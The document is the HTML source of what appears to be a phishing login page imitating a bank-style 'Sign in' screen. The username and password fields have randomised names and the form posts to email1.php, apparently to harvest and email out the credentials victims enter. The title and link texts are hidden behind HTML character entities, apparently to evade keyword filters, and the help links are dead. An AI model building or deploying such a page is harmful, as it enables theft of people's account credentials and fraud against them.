
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
<title>&#83;&#105;&#103;&#110;&#32;&#105;n</title>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
<link rel="shortcut icon" href="images/favicoon.ico"/>
 
<link rel="stylesheet" href="css/style.css">
 
<body>
<div class="container1">
<img src="images/logo.png">
</div><br /><br />
<div class="container">  
  <form id="contact" action=email1.php method=post>
   
    
    <fieldset>
      <input placeholder="Username" type="text"  required  name="uname7828">
    </fieldset>
    <fieldset>
      <input placeholder="Password" type="password"  required name="pas9089">
    </fieldset>
    <fieldset>
      <input  type="checkbox" /> <span style="font-size:14px">Remember me</span>  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; <input  type="checkbox" /> <span style="font-size:14px">Use token</span>
    </fieldset>
     
    <fieldset>
      <input name="submit" type="submit" id="contact-submit"  value="Sign in">    </fieldset>
    <p style="font-size:15px; color: #0066CC"><a href="#" style=" text-decoration:none">&#x46;&#x6F;&#x72;&#x67;&#x6F;&#x74;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6E;&#x61;&#x6D;&#x65;&#x2F;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;&#x3F; &rsaquo;</a><br>
<a href="#" style=" text-decoration:none">&#x4E;&#x6F;&#x74;&#x20;&#x65;&#x6E;&#x72;&#x6F;&#x6C;&#x6C;&#x65;&#x64;&#x3F;&#x20;&#x53;&#x69;&#x67;&#x6E;&#x20;&#x75;&#x70;&#x20;&#x6E;&#x6F;&#x77;&#x2E; &#8250;</a></p>
  </form>
</div><br /><br />
<img src="images/5.gif" alt="" title="" border=0 width=100% >